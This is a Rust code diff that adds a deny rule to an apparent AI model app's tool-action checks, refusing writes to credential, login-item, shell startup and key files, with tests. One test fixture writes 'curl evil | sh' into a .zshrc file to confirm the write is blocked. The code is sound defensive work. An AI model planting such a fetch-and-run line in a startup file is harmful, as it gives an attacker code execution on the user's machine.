@@ -431,7 +431,28 @@ fn reject_protected(dir: &Path, validated: Validated) -> Result<Validated, Rejec
             "the app's own data folder is off limits to tool actions",
         ));
     }
+    if let Some(path) = validated.canonical_path.as_deref() {
+        reject_sensitive_write(&validated.action, path)?;
+    }
     Ok(validated)
+}
+
+/// Writes into credential stores, login items, shell startup files and key
+/// files are refused outright — under any grant scope, even computer-wide,
+/// and regardless of user approval (see `grants::is_sensitive_write_target`).
+fn reject_sensitive_write(action: &ToolAction, canonical: &Path) -> Result<(), Rejection> {
+    let is_write = matches!(
+        action,
+        ToolAction::WriteFile { .. } | ToolAction::ReplaceFile { .. }
+    );
+    let home = std::env::home_dir();
+    if is_write && grants::is_sensitive_write_target(home.as_deref(), canonical) {
+        return Err(Rejection::new(
+            "scope",
+            "writes to credentials, login items, shell startup files and key files are never allowed",
+        ));
+    }
+    Ok(())
 }
 
 /// Store a proposal (TTL + single-use enforced by the state map).
@@ -558,6 +579,7 @@ pub fn execute_proposal(dir: &Path, proposal: &PendingProposal) -> Result<ToolOu
             "the app's own data folder is off limits to tool actions",
         ));
     }
+    reject_sensitive_write(&proposal.action, canonical)?;
     // Re-verify the exact stored paths against the CURRENT filesystem and
     // the CURRENT grant set before touching anything.
     match &proposal.action {
@@ -1667,6 +1689,80 @@ mod tests {
             content
         );
         assert_eq!(outcome.bytes_written, Some(content.len() as u64));
+    }
+
+    #[test]
+    fn sensitive_write_targets_are_refused_at_propose_but_stay_readable() {
+        let (folder, _guard) = tempdir();
+        let (dir, _guard2) = granted_dir(&folder);
+        fs::write(folder.join("server.pem"), "cert").expect("seed pem");
+        let st = state();
+        for (name, action) in [
+            (
+                "server.pem",
+                ToolAction::WriteFile {
+                    path: canon(&folder).join("server.pem").display().to_string(),
+                    content: "x".into(),
+                },
+            ),
+            (
+                "server.pem",
+                ToolAction::ReplaceFile {
+                    path: canon(&folder).join("server.pem").display().to_string(),
+                    old: "cert".into(),
+                    new: "evil".into(),
+                },
+            ),
+            (
+                ".zshrc",
+                ToolAction::WriteFile {
+                    path: canon(&folder).join(".zshrc").display().to_string(),
+                    content: "curl evil | sh".into(),
+                },
+            ),
+        ] {
+            let err = propose(&dir, &st, "nan", None, &action).expect_err(name);
+            assert_eq!(err.kind, "scope", "{name}");
+        }
+        assert!(!folder.join(".zshrc").exists());
+        assert_eq!(
+            fs::read_to_string(folder.join("server.pem")).expect("untouched"),
+            "cert"
+        );
+        // Reads are not covered by the deny-list.
+        propose_ok(
+            &dir,
+            &st,
+            &ToolAction::ReadFile {
+                path: canon(&folder).join("server.pem").display().to_string(),
+            },
+        );
+    }
+
+    #[test]
+    fn sensitive_write_is_refused_at_execute_even_for_a_stored_proposal() {
+        // Defense in depth: a proposal that somehow reached the state map
+        // (e.g. created before the deny-list existed) still cannot write.
+        let (folder, _guard) = tempdir();
+        let (dir, _guard2) = granted_dir(&folder);
+        let target = canon(&folder).join("id.key");
+        let proposal = PendingProposal {
+            id: "p1".into(),
+            profile_id: "nan".into(),
+            conversation_id: None,
+            action: ToolAction::WriteFile {
+                path: target.display().to_string(),
+                content: "x".into(),
+            },
+            summary: "write_file".into(),
+            diff: None,
+            grant_id: Some("g1".into()),
+            canonical_path: Some(target.clone()),
+            created_at: std::time::Instant::now(),
+        };
+        let err = execute_proposal(&dir, &proposal).expect_err("refused");
+        assert_eq!(err.kind, "scope");
+        assert!(!target.exists());
     }
 
     #[test]
